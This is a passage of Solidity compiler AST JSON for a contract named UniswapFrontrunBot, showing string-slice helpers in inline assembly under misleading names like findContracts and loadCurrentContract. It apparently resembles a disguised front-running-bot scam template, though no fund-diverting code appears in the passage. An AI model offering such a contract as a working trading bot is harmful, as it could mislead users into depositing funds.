																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "+",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 240,
																					"name": "selflen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 190,
																					"src": "3187:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "3177:17:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 242,
																				"name": "needlelen",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 194,
																				"src": "3197:9:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "3177:29:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "3166:40:0"
																	},
																	{
																		"assignments": [
																			246
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 246,
																				"mutability": "mutable",
																				"name": "ptrdata",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 268,
																				"src": "3225:15:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 245,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "3225:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 247,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "3225:15:0"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "3268:36:0",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "3270:32:0",
																					"value": {
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "ptr",
																										"nodeType": "YulIdentifier",
																										"src": "3291:3:0"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "3285:5:0"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "3285:10:0"
																							},
																							{
																								"name": "mask",
																								"nodeType": "YulIdentifier",
																								"src": "3297:4:0"
																							}
																						],
																						"functionName": {
																							"name": "and",
																							"nodeType": "YulIdentifier",
																							"src": "3281:3:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "3281:21:0"
																					},
																					"variableNames": [
																						{
																							"name": "ptrdata",
																							"nodeType": "YulIdentifier",
																							"src": "3270:7:0"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 215,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3297:4:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 202,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3291:3:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 246,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3270:7:0",
																				"valueSize": 1
																			}
																		],
																		"id": 248,
																		"nodeType": "InlineAssembly",
																		"src": "3259:45:0"
																	},
																	{
																		"body": {
																			"id": 264,
																			"nodeType": "Block",
																			"src": "3355:203:0",
																			"statements": [
																				{
																					"condition": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 254,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 252,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 202,
																							"src": "3382:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": ">=",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 253,
																							"name": "end",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 238,
																							"src": "3389:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "3382:10:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"falseBody": null,
																					"id": 259,
																					"nodeType": "IfStatement",
																					"src": "3378:65:0",
																					"trueBody": {
																						"expression": {
																							"argumentTypes": null,
																							"commonType": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							},
																							"id": 257,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftExpression": {
																								"argumentTypes": null,
																								"id": 255,
																								"name": "selfptr",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 192,
																								"src": "3426:7:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "BinaryOperation",
																							"operator": "+",
																							"rightExpression": {
																								"argumentTypes": null,
																								"id": 256,
																								"name": "selflen",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 190,
																								"src": "3436:7:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"src": "3426:17:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"functionReturnParameters": 200,
																						"id": 258,
																						"nodeType": "Return",
																						"src": "3419:24:0"
																					}
																				},
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 261,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"nodeType": "UnaryOperation",
																						"operator": "++",
																						"prefix": false,
																						"src": "3466:5:0",
																						"subExpression": {
																							"argumentTypes": null,
																							"id": 260,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 202,
																							"src": "3466:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 262,
																					"nodeType": "ExpressionStatement",
																					"src": "3466:5:0"
																				},
																				{
																					"AST": {
																						"nodeType": "YulBlock",
																						"src": "3503:36:0",
																						"statements": [
																							{
																								"nodeType": "YulAssignment",
																								"src": "3505:32:0",
																								"value": {
																									"arguments": [
																										{
																											"arguments": [
																												{
																													"name": "ptr",
																													"nodeType": "YulIdentifier",
																													"src": "3526:3:0"
																												}
																											],
																											"functionName": {
																												"name": "mload",
																												"nodeType": "YulIdentifier",
																												"src": "3520:5:0"
																											},
																											"nodeType": "YulFunctionCall",
																											"src": "3520:10:0"
																										},
																										{
																											"name": "mask",
																											"nodeType": "YulIdentifier",
																											"src": "3532:4:0"
																										}
																									],
																									"functionName": {
																										"name": "and",
																										"nodeType": "YulIdentifier",
																										"src": "3516:3:0"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "3516:21:0"
																								},
																								"variableNames": [
																									{
																										"name": "ptrdata",
																										"nodeType": "YulIdentifier",
																										"src": "3505:7:0"
																									}
																								]
																							}
																						]
																					},
																					"evmVersion": "istanbul",
																					"externalReferences": [
																						{
																							"declaration": 215,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3532:4:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 202,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3526:3:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 246,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3505:7:0",
																							"valueSize": 1
																						}
																					],
																					"id": 263,
																					"nodeType": "InlineAssembly",
																					"src": "3494:45:0"
																				}
																			]
																		},
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			},
																			"id": 251,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 249,
																				"name": "ptrdata",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 246,
																				"src": "3332:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "!=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 250,
																				"name": "needledata",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 234,
																				"src": "3343:10:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			"src": "3332:21:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 265,
																		"nodeType": "WhileStatement",
																		"src": "3325:233:0"
																	},
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 266,
																			"name": "ptr",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 202,
																			"src": "3583:3:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"functionReturnParameters": 200,
																		"id": 267,
																		"nodeType": "Return",
																		"src": "3576:10:0"
																	}
																]
															}
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 307,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 305,
														"name": "selfptr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 192,
														"src": "4115:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"id": 306,
														"name": "selflen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 190,
														"src": "4125:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "4115:17:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 200,
												"id": 308,
												"nodeType": "Return",
												"src": "4108:24:0"
											}
										]
									},
									"documentation": null,
									"id": 310,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "findContracts",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 197,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 190,
												"mutability": "mutable",
												"name": "selflen",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 310,
												"src": "2743:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 189,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2743:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 192,
												"mutability": "mutable",
												"name": "selfptr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 310,
												"src": "2757:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 191,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2757:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 194,
												"mutability": "mutable",
												"name": "needlelen",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 310,
												"src": "2771:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 193,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2771:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 196,
												"mutability": "mutable",
												"name": "needleptr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 310,
												"src": "2787:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 195,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2787:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2742:60:0"
									},
									"returnParameters": {
										"id": 200,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 199,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 310,
												"src": "2825:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 198,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2825:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2824:6:0"
									},
									"scope": 1680,
									"src": "2720:1420:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 327,
										"nodeType": "Block",
										"src": "4366:134:0",
										"statements": [
											{
												"assignments": [
													318
												],
												"declarations": [
													{
														"constant": false,
														"id": 318,
														"mutability": "mutable",
														"name": "ret",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 327,
														"src": "4377:17:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 317,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "4377:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 320,
												"initialValue": {
													"argumentTypes": null,
													"id": 319,
													"name": "self",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 312,
													"src": "4397:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "4377:24:0"
											},
											{
												"assignments": [
													322
												],
												"declarations": [
													{
														"constant": false,
														"id": 322,
														"mutability": "mutable",
														"name": "retptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 327,
														"src": "4412:11:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 321,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "4412:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 323,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "4412:11:0"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "4443:26:0",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "4445:22:0",
															"value": {
																"arguments": [
																	{
																		"name": "ret",
																		"nodeType": "YulIdentifier",
																		"src": "4459:3:0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4464:2:0",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "4455:3:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "4455:12:0"
															},
															"variableNames": [
																{
																	"name": "retptr",
																	"nodeType": "YulIdentifier",
																	"src": "4445:6:0"
																}
															]
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 318,
														"isOffset": false,
														"isSlot": false,
														"src": "4459:3:0",
														"valueSize": 1
													},
													{
														"declaration": 322,
														"isOffset": false,
														"isSlot": false,
														"src": "4445:6:0",
														"valueSize": 1
													}
												],
												"id": 324,
												"nodeType": "InlineAssembly",
												"src": "4434:35:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 325,
													"name": "ret",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 318,
													"src": "4489:3:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 316,
												"id": 326,
												"nodeType": "Return",
												"src": "4482:10:0"
											}
										]
									},
									"documentation": null,
									"id": 328,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "loadCurrentContract",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 313,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 312,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 328,
												"src": "4308:18:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 311,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "4308:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4307:20:0"
									},
									"returnParameters": {
										"id": 316,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 315,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 328,
												"src": "4351:13:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 314,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "4351:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4350:15:0"
									},
									"scope": 1680,
									"src": "4279:221:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 445,
										"nodeType": "Block",
										"src": "4804:823:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 342,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 337,
															"name": "rune",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 332,
															"src": "4815:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																"typeString": "struct UniswapFrontrunBot.slice memory"
															}
														},
														"id": 339,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 38,
														"src": "4815:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 340,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 330,
															"src": "4827:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																"typeString": "struct UniswapFrontrunBot.slice memory"
															}
														},
														"id": 341,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 38,
														"src": "4827:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "4815:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 343,
												"nodeType": "ExpressionStatement",
												"src": "4815:21:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 347,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 344,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 330,
															"src": "4854:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																"typeString": "struct UniswapFrontrunBot.slice memory"
															}
														},
														"id": 345,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 36,
														"src": "4854:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 346,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "4867:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "4854:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 357,
												"nodeType": "IfStatement",
												"src": "4850:86:0",
												"trueBody": {
													"id": 356,
													"nodeType": "Block",
													"src": "4870:66:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 352,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 348,
																		"name": "rune",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 332,
																		"src": "4885:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																			"typeString": "struct UniswapFrontrunBot.slice memory"
																		}
																	},
																	"id": 350,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 36,
																	"src": "4885:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 351,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "4897:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "4885:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 353,
															"nodeType": "ExpressionStatement",
															"src": "4885:13:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 354,
																"name": "rune",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 332,
																"src": "4920:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																	"typeString": "struct UniswapFrontrunBot.slice memory"
																}
															},
															"functionReturnParameters": 336,
															"id": 355,
															"nodeType": "Return",
															"src": "4913:11:0"
														}
													]
												}
											},
											{
												"assignments": [
													359
												],
												"declarations": [
													{
														"constant": false,
														"id": 359,
														"mutability": "mutable",
														"name": "l",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 445,
														"src": "4949:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 358,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "4949:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 360,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "4949:6:0"
											},
											{
												"assignments": [
													362
												],
												"declarations": [
													{
														"constant": false,
														"id": 362,
														"mutability": "mutable",
														"name": "b",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 445,
														"src": "4966:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 361,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "4966:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 363,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "4966:6:0"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "5055:56:0",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "5057:52:0",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "self",
																										"nodeType": "YulIdentifier",
																										"src": "5086:4:0"
																									},
																									{
																										"kind": "number",
																										"nodeType": "YulLiteral",
																										"src": "5092:2:0",
																										"type": "",
																										"value": "32"
																									}
																								],
																								"functionName": {
																									"name": "add",
																									"nodeType": "YulIdentifier",
																									"src": "5082:3:0"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "5082:13:0"
																							}
																						],
																						"functionName": {
																							"name": "mload",
																							"nodeType": "YulIdentifier",
																							"src": "5076:5:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "5076:20:0"
																					},
																					{
																						"kind": "number",
																						"nodeType": "YulLiteral",
																						"src": "5098:2:0",
																						"type": "",
																						"value": "31"
																					}
																				],
																				"functionName": {
																					"name": "sub",
																					"nodeType": "YulIdentifier",
																					"src": "5072:3:0"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "5072:29:0"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "5066:5:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "5066:36:0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "5104:4:0",
																		"type": "",
																		"value": "0xFF"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "5062:3:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "5062:47:0"
															},
															"variableNames": [
																{
																	"name": "b",
																	"nodeType": "YulIdentifier",
																	"src": "5057:1:0"
																}
															]
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 362,
														"isOffset": false,
														"isSlot": false,
														"src": "5057:1:0",
														"valueSize": 1
													},
													{
														"declaration": 330,
														"isOffset": false,
														"isSlot": false,
														"src": "5086:4:0",
														"valueSize": 1
													}
												],
												"id": 364,
												"nodeType": "InlineAssembly",
												"src": "5046:65:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 367,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 365,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 362,
														"src": "5125:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30783830",
														"id": 366,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "5129:4:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_128_by_1",
															"typeString": "int_const 128"
														},
														"value": "0x80"
													},
													"src": "5125:8:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 375,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
